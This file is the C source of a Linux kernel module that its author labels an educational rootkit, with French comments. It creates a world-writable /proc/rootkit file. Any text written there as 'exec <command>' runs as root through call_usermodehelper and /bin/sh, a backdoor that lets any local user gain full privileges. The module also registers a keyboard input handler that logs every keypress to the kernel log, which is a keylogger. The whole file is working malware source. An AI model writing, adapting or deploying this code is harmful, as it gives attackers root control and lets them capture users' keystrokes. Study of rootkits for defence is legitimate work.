#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/uaccess.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>

#define PROC_NAME "rootkit"
#define BUFFER_SIZE 256

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shayman");
MODULE_DESCRIPTION("Rootkit pedagogique");
MODULE_VERSION("0.1");

static struct proc_dir_entry *proc_entry;

// Fonction pour executer une commande utilisateur depuis le kernel
void exec_user_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    printk(KERN_INFO "[rootkit] Ex�cution de la commande : %s\n", cmd);
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
}


// Fonction appel�e lors de l'�criture dans /proc/rootkit
ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos) {
    char commande[BUFFER_SIZE] = {0};

    if (count > sizeof(commande) - 1)
        return -EINVAL;

    if (copy_from_user(commande, buffer, count))
        return -EFAULT;

    commande[count] = '\0';

    printk(KERN_INFO "[rootkit] Commande recue : %s\n", commande);

    // V�rifie si la commande commence par "exec"
    if (strncmp(commande, "exec", 4) == 0) {
        char *arg = commande + 5; // saute "exec "

        if (*arg != '\0') {
            exec_user_cmd(arg);
        } else {
            printk(KERN_INFO "[rootkit] Aucune commande specifiee apres 'exec'\n");
        }
    }

    return count;
}

// Fonction appel�e lors de la lecture de /proc/rootkit
ssize_t proc_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
{
    char output[] = "rootkit: module pedagogique actif\n";
    return simple_read_from_buffer(ubuf, len, off, output, strlen(output));
}

static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
    .proc_write = proc_write,
};

static int __init rk_init(void)
{
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        pr_alert("Erreur creation /proc/%s\n", PROC_NAME);
        return -ENOMEM;
    }

    pr_info("[rootkit] Module charge avec succes\n");
    return 0;
}

static void __exit rk_exit(void)
{
    proc_remove(proc_entry);
    pr_info("[rootkit] Module decharge proprement\n");
}

static struct input_handle *keylogger_handle;

static bool is_keyboard(struct input_dev *dev) {
    return test_bit(EV_KEY, dev->evbit) && test_bit(KEY_A, dev->keybit);
}

static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1) {  // touche appuy�e
        printk(KERN_INFO "[rootkit-keylogger] Keycode: %u\n", code);
    }
}

static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    int error;

    if (!is_keyboard(dev))
        return -ENODEV;

    keylogger_handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!keylogger_handle)
        return -ENOMEM;

    keylogger_handle->dev = dev;
    keylogger_handle->handler = handler;
    keylogger_handle->name = "rootkit_keylogger";

    error = input_register_handle(keylogger_handle);
    if (error)
        goto err_free;

    error = input_open_device(keylogger_handle);
    if (error)
        goto err_unregister;

    printk(KERN_INFO "[rootkit-keylogger] Connected to keyboard device\n");
    return 0;

err_unregister:
    input_unregister_handle(keylogger_handle);
err_free:
    kfree(keylogger_handle);
    return error;
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
    printk(KERN_INFO "[rootkit-keylogger] Disconnected from keyboard device\n");
}

static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "rootkit_keylogger",
    .id_table = keylogger_ids,
};

static int __init keylogger_init(void) {
    return input_register_handler(&keylogger_handler);
}

static void __exit keylogger_exit(void) {
    input_unregister_handler(&keylogger_handler);
}

static int __init mymodule_init(void) {
    int ret;

    ret = keylogger_init();
    if (ret)
        return ret;

    ret = rk_init();
    if (ret) {
        keylogger_exit();
        return ret;
    }

    return 0;
}

static void __exit mymodule_exit(void) {
    rk_exit();
    keylogger_exit();
}


module_init(mymodule_init);
module_exit(mymodule_exit);
